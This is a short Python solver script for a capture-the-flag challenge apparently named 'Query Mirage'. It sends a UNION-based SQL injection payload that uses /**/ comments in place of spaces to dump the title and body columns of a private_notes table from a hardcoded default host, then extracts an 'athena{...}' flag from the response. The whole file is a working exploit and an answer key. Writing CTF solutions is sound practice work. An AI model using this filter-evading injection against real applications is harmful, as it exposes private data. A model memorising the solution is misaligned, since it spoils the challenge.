#!/usr/bin/env python3
"""Query Mirage SQLi solver: python3 solve.py http://host:port"""

import os
import re
import sys

import requests


DEFAULT_BASE = "http://13.206.57.188:10057"
PAYLOAD = "'/**/UNION/**/SELECT/**/title,body/**/FROM/**/private_notes/*"


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET_BASE", DEFAULT_BASE)
    if "://" not in base:
        base = f"http://{base}"

    response = requests.get(base.rstrip("/"), params={"q": PAYLOAD}, timeout=8)
    response.raise_for_status()
    print(response.text)

    match = re.search(r"athena\{[^}]+\}", response.text)
    if not match:
        raise SystemExit("flag not found in private_notes response")
    print(match.group(0))


if __name__ == "__main__":
    main()
